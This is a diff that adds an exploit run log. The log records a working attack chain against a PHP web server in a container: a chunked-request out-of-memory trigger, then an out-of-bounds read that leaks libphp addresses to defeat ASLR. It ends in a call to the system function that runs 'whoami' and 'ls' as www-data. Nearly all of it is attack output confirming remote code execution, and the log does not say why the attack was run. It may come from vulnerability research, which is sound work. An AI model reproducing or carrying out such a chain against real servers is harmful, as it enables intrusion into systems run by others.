@@ -1,0 +1,23 @@
+
+=== 2026-10-23T13:39:43.140682+00:00 ===
+[*] exec: whoami; ls -la /out
+[*] restarting container p2s-8335 for fresh ASLR
+[try 1/3] A1: END-cleanup send_cookie OOM
+      A1 body generated; sending chunked END-cleanup OOM
+      A1 -> status='HTTP/1.0 500 Internal Server Error' bytes=211 set-cookie=none
+      B1 body generated; sending chunked stale-id OOB read
+      B1 -> status='HTTP/1.1 200 OK' bytes=1270403 set-cookie=[1270184]
+      decoded=819208 zval_ptr_dtor=0x7f14ef040c50 -> libphp=0x7f14eeba2000
+      chunk buckets: [('0x7f14e4e00000', 3527), ('0x7f14ef000000', 1168), ('0x7f14e5800000', 165)]
+      dtor anchor: bucket=0x7f14ef000000 carrier_chunk=0x7f14ed000000
+[try 1] A2 + B2 (1/1): base=0x7f14ed000000 S=0x7f14ed0f9398 zif_system=0x7f14eef4e080
+[+] output (/out/o821c558a):
+www-data
+total 28
+drwxr-xr-x 2 www-data www-data 4096 Oct 23 13:39 .
+drwxr-xr-x 1 root     root     4096 Oct 23 13:37 ..
+-rw-r--r-- 1 www-data www-data   54 Oct 23 13:39 o2fb518ba
+-rw-r--r-- 1 www-data www-data   41 Oct 23 13:39 o665d2879
+-rw-r--r-- 1 www-data www-data   54 Oct 23 13:38 o7b902227
+-rw-r--r-- 1 www-data www-data    9 Oct 23 13:39 o821c558a
+-rw-r--r-- 1 www-data www-data   54 Oct 23 13:39 od55a5f4f
